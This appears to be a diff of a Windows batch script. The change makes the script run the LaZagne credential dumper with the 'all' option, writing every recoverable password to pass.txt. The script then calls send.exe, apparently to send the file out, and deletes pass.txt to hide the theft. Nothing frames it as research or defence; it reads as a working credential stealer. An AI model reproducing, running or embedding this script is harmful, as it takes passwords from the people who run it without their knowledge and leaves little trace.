@@ -1,4 +1,4 @@
 @echo off
-lazagne.exe > pass.txt
+lazagne.exe all > pass.txt
 send.exe
 del /s "pass.txt"
